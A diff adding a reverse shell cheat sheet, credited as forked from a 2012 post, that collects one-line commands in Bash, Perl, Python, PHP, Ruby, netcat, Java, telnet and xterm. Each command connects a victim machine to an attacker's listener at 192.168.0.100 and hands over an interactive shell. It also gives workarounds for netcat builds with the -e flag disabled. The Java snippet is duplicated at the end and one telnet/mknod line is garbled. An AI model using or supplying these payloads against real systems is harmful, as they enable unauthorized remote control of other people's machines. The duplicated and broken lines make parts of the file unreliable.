@@ -1,0 +1,76 @@
+<h1>Reverse Shell Cheat Sheet</h1>
+<i>Forked from: Published February 5, 2012 | By phillips321</i>
+
+Step one – Set up your listener.
+  nc -l -v attackerip 4444
+
+In all these examples the attacker IP will be 192.168.0.100
+
+Bash
+  exec 5<>/dev/tcp/192.168.0.100/4444
+  cat <&5 | while read line; do $line 2>&5 >&5; done
+
+  <&196;exec 196<>/dev/tcp/192.168.0.100/4444; sh <&196 >&196 2>&196
+
+
+  bash -i >& /dev/tcp/192.168.0.100/4444 0>&1
+
+Perl
+ perl -e 'use socket;$i="192.168.0.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.100:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+For windows based systems you can use
+
+  perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"192.168.0.100:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+Python
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP
+  php -r '$sock=fsockopen("192.168.0.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Ruby
+  ruby -rsocket -e'f=TCPSocket.open("192.168.0.100",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
+
+The following does not need /bin/sh:
+  ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.100","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+The following is for windows based systems:
+  ruby -rsocket -e 'c=TCPSocket.new("192.168.0.100","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+NetCat
+ nc -e /bin/sh 192.168.0.100 4444
+
+ nc -c /bin/sh 192.168.0.100 4444
+
+ /bin/sh | nc 192.168.0.100 4444
+
+If the -e flag is disabled you can get around it using the following
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+  rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
+
+Java
+  r = Runtime.getRuntime()
+  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+  p.waitFor()
+
+Telnet
+If netcat is missing (and in most cases you wont have this), then use telnet:
+  rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.0.100 4444 0/tmp/p
+  telnet 192.168.0.100 4444 | /bin/bash | telnet 192.168.0.100 4445
+# also listen on your machine also on port 4445/tcp
+
+Xterm
+This one is a little more tricky, you need to start a listener on the attacker box to catch the incoming xterm
+  Xnest :1; xterm -display 127.0.0.1:1
+
+and then inside the spawned xterm session run this:
+  xhost +victimip
+
+Then on the victim you need to run this
+  xterm -display 192.168.0.100:1
+  r = Runtime.getRuntime()
+  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+  p.waitFor()
